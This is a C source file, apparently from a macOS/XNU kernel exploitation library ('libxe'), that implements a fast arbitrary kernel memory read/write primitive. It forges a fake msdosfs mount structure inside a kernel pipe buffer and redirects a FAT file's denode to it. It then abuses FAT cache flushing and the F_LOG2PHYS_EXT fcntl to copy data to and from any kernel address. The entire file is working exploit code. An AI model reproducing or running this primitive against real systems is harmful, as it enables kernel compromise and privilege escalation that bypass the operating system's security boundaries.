//
//  kmem_fast.c
//  libxe
//
//  Created by sreejith on 3/12/22.
//

#include <limits.h>

#include <sys/fcntl.h>

#include "memory/kmem_fast.h"
#include "memory/kmem.h"
#include "memory/kmem_internal.h"
#include "slider/kernel.h"
#include "xnu/proc.h"
#include "util/msdosfs.h"
#include "util/assert.h"
#include "util/log.h"

#include "../external/msdosfs/msdosfs.h"


typedef struct xe_memory_kmem_fast {
    xe_util_msdosfs_t msdosfs_util;
    uintptr_t msdosfs_mount;
    uintptr_t msdosfs_mount_fake;
    
    int cctl_fd;
    uintptr_t cctl_dep;
    
    int bridge_fd;
    uintptr_t bridge_vnode;
    
    int pipe_read_fd;
    int pipe_write_fd;
    
    char bridge_path[PATH_MAX];
    char mount_data[TYPE_MSDOSFSMOUNT_SIZE];
} *xe_memory_kmem_fast_t;


void xe_kmem_fast_flush_worker_cache(xe_memory_kmem_fast_t kmem) {
    int error = fcntl(kmem->cctl_fd, F_FLUSH_DATA);
    xe_assert_err(error);
}


void xe_kmem_fast_update_mount(xe_memory_kmem_fast_t kmem, const char mount[TYPE_MSDOSFSMOUNT_SIZE]) {
    ssize_t bytes_written = write(kmem->pipe_write_fd, mount, TYPE_MSDOSFSMOUNT_SIZE);
    xe_assert_cond(bytes_written, ==, TYPE_MSDOSFSMOUNT_SIZE);
    char buffer[TYPE_MSDOSFSMOUNT_SIZE];
    // reset the write position back to 0
    ssize_t bytes_read = read(kmem->pipe_read_fd, buffer, TYPE_MSDOSFSMOUNT_SIZE);
    xe_assert_cond(bytes_read, ==, TYPE_MSDOSFSMOUNT_SIZE);
    xe_assert(memcmp(buffer, mount, TYPE_MSDOSFSMOUNT_SIZE) == 0);
}


void xe_memory_kmem_fast_read(void* ctx, void* dst, uintptr_t src, size_t size) {
    xe_memory_kmem_fast_t kmem = (xe_memory_kmem_fast_t)ctx;
    
    char mount[TYPE_MSDOSFSMOUNT_SIZE];
    memcpy(mount, kmem->mount_data, sizeof(mount));
    
    uint64_t* pm_fat_cache = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET);
    uint32_t* pm_fat_cache_offset = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET_OFFSET);
    uint* pm_flags = (uint*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FLAGS_OFFSET);
    int* pm_fat_flags = (int*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_FLAGS_OFFSET);
    uint32_t* pm_block_size = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BLOCK_SIZE_OFFSET);
    uint64_t* pm_fat_active_vp = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
    uint64_t* pm_sync_timer = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_SYNC_TIMER);
    xe_assert(size <= *pm_block_size);
    
    *pm_fat_cache = src;
    *pm_fat_cache_offset = 0;
    *pm_block_size = (uint32_t)size;
    *pm_fat_active_vp = kmem->bridge_vnode;
    *pm_flags &= (~MSDOSFSMNT_RONLY);
    *pm_fat_flags = 1; // mark fat cache dirty
    *pm_sync_timer = 0;
    
    xe_kmem_fast_update_mount(kmem, mount);
    
    int res = ftruncate(kmem->bridge_fd, size);
    xe_assert_errno(res);
    off_t off = lseek(kmem->bridge_fd, 0, SEEK_SET);
    xe_assert_errno(off < 0);
    xe_kmem_fast_flush_worker_cache(kmem);
    ssize_t bytes_read = read(kmem->bridge_fd, dst, size);
    xe_assert_cond(bytes_read, ==, size);
    
    xe_kmem_fast_update_mount(kmem, kmem->mount_data);
}


void xe_memory_kmem_fast_populate_cache(xe_memory_kmem_fast_t kmem) {
    int res = 0;
    int tries = 0;
    do {
        struct log2phys args;
        bzero(&args, sizeof(args));
        args.l2p_contigbytes = 16384 + random();
        args.l2p_devoffset = 16384 + random();
        res = fcntl(kmem->cctl_fd, F_LOG2PHYS_EXT, &args);
        tries++;
    } while (res == 0 && tries < 5);
    xe_assert_cond(res, ==, -1);
    xe_assert(errno == EIO || errno == E2BIG);
}


void xe_memory_kmem_fast_write(void* ctx, uintptr_t dst, void* src, size_t size) {
    xe_memory_kmem_fast_t kmem = (xe_memory_kmem_fast_t)ctx;
    
    char mount[TYPE_MSDOSFSMOUNT_SIZE];
    memcpy(mount, kmem->mount_data, sizeof(mount));
    
    uint64_t* pm_fat_cache = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET);
    uint32_t* pm_fat_cache_offset = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET_OFFSET);
    uint* pm_fatmult = (uint*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FATMULT);
    uint32_t* pm_block_size = (uint32_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BLOCK_SIZE_OFFSET);
    uint64_t* pm_fat_active_vp = (uint64_t*)(mount + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
    
    *pm_fat_cache = dst;
    *pm_fat_cache_offset = INT32_MAX;
    *pm_block_size = (uint32_t)size;
    *pm_fatmult = 0;
    *pm_fat_active_vp = kmem->bridge_vnode;
    
    int res = ftruncate(kmem->bridge_fd, size);
    xe_assert_errno(res);
    off_t off = lseek(kmem->bridge_fd, 0, SEEK_SET);
    xe_assert_errno(off < 0);
    ssize_t bytes_written = write(kmem->bridge_fd, src, size);
    xe_assert_cond(bytes_written, ==, size);
    
    xe_kmem_fast_update_mount(kmem, mount);
    xe_memory_kmem_fast_populate_cache(kmem);
    xe_kmem_fast_update_mount(kmem, kmem->mount_data);
}


const static struct xe_kmem_ops xe_memory_kmem_fast_ops = {
    .read = xe_memory_kmem_fast_read,
    .write = xe_memory_kmem_fast_write,
    .max_read_size = 1024,
    .max_write_size = 1024,
};


xe_kmem_backend_t xe_memory_kmem_fast_create(const char* base_img_path) {
    xe_util_msdosfs_loadkext();
    
    xe_util_msdosfs_t util_msdosfs;
    int error = xe_util_msdosfs_mount(base_img_path, "kmem_fast", &util_msdosfs);
    xe_assert_err(error);
    
    uintptr_t proc = xe_xnu_proc_current_proc();
    
    char mount_path[PATH_MAX];
    xe_util_msdosfs_get_mountpoint(util_msdosfs, mount_path, sizeof(mount_path));
    
    int fd_mount = xe_util_msdosfs_get_mount_fd(util_msdosfs);
    uintptr_t vnode_mount;
    error = xe_xnu_proc_find_fd_data(proc, fd_mount, &vnode_mount);
    xe_assert_err(error);
    uintptr_t mount = xe_kmem_read_ptr(vnode_mount, TYPE_VNODE_MEM_VN_UN_OFFSET);
    uintptr_t msdosfs_mount = xe_kmem_read_ptr(mount, TYPE_MOUNT_MEM_MNT_DATA_OFFSET);
    xe_log_debug("mounted msdosfs at %s fd: %d, vnode: %p, mount: %p and msdosfs_mount: %p", mount_path, fd_mount, (void*)vnode_mount, (void*)mount, (void*)msdosfs_mount);
    
    int pfds[2];
    int res = pipe(pfds);
    xe_assert_errno(res);
    char buffer[TYPE_MSDOSFSMOUNT_SIZE];
    xe_kmem_read(buffer, msdosfs_mount, 0, TYPE_MSDOSFSMOUNT_SIZE);
    // reserve as buffer of size TYPE_MSDOSFSMOUNT_SIZE in opened pipe
    ssize_t bytes_written = write(pfds[1], buffer, sizeof(buffer));
    xe_assert_cond(bytes_written, ==, sizeof(buffer));
    // reset the write position to 0
    ssize_t bytes_read = read(pfds[0], buffer, sizeof(buffer));
    xe_assert_cond(bytes_read, ==, sizeof(buffer));
    
    uintptr_t pipe;
    error = xe_xnu_proc_find_fd_data(proc, pfds[0], &pipe);
    xe_assert_err(error);
    uintptr_t fake_msdosfs_mount = xe_kmem_read_ptr(pipe, TYPE_PIPEBUF_MEM_BUFFER_OFFSET);
    xe_log_debug("fake msdosfsmount created at %p by pipe: %p, read fd: %d and write fd: %d", (void*)fake_msdosfs_mount, (void*)pipe, pfds[0], pfds[1]);
    
    char cctl_path[PATH_MAX];
    snprintf(cctl_path, sizeof(cctl_path), "%s/data1", mount_path);
    int fd_cctl = open(cctl_path, O_RDONLY);
    xe_assert_errno(fd_cctl < 0);
    uintptr_t vnode_cctl;
    error = xe_xnu_proc_find_fd_data(proc, fd_cctl, &vnode_cctl);
    xe_assert_err(error);
    uintptr_t denode_cctl = xe_kmem_read_ptr(vnode_cctl, TYPE_VNODE_MEM_VN_DATA_OFFSET);
    xe_assert_cond(xe_kmem_read_uint64(denode_cctl, TYPE_DENODE_MEM_DE_PMP_OFFSET), ==, msdosfs_mount);
    xe_log_debug("msdosfs cctl file opened at fd: %d, vnode: %p, dep: %p", fd_cctl, (void*)vnode_cctl, (void*)denode_cctl);
    
    char bridge_path[] = "/tmp/xe_kmem_fast_bridge.XXXXXXXXX";
    int fd_bridge = mkostemp(bridge_path, O_EXLOCK);
    xe_assert_errno(fd_bridge < 0);
    uintptr_t vnode_bridge;
    error = xe_xnu_proc_find_fd_data(proc, fd_bridge, &vnode_bridge);
    xe_assert_err(error);
    xe_log_debug("bridge file opened at fd: %d, vnode: %p", fd_bridge, (void*)vnode_bridge);
    
    xe_memory_kmem_fast_t kmem = malloc(sizeof(struct xe_memory_kmem_fast));
    kmem->msdosfs_mount = msdosfs_mount;
    kmem->msdosfs_util = util_msdosfs;
    kmem->msdosfs_mount_fake = fake_msdosfs_mount;
    kmem->cctl_fd = fd_cctl;
    kmem->cctl_dep = denode_cctl;
    kmem->pipe_read_fd = pfds[0];
    kmem->pipe_write_fd = pfds[1];
    kmem->bridge_fd = fd_bridge;
    kmem->bridge_vnode = vnode_bridge;
    
    strlcpy(kmem->bridge_path, bridge_path, sizeof(kmem->bridge_path));
    xe_kmem_read(kmem->mount_data, msdosfs_mount, 0, sizeof(kmem->mount_data));
    
    xe_kmem_write_uint64(kmem->cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET, kmem->msdosfs_mount_fake);
    return xe_kmem_backend_create(&xe_memory_kmem_fast_ops, kmem);
}


void xe_memory_kmem_fast_destroy(xe_kmem_backend_t* backend_p) {
    xe_memory_kmem_fast_t kmem = xe_kmem_backend_get_ctx(*backend_p);
    xe_kmem_write_uint64(kmem->cctl_dep, TYPE_DENODE_MEM_DE_PMP_OFFSET, kmem->msdosfs_mount);
    close(kmem->pipe_read_fd);
    close(kmem->pipe_write_fd);
    close(kmem->cctl_fd);
    close(kmem->bridge_fd);
    remove(kmem->bridge_path);
    xe_util_msdosfs_unmount(&kmem->msdosfs_util);
    free(kmem);
    xe_kmem_backend_destroy(backend_p);
}
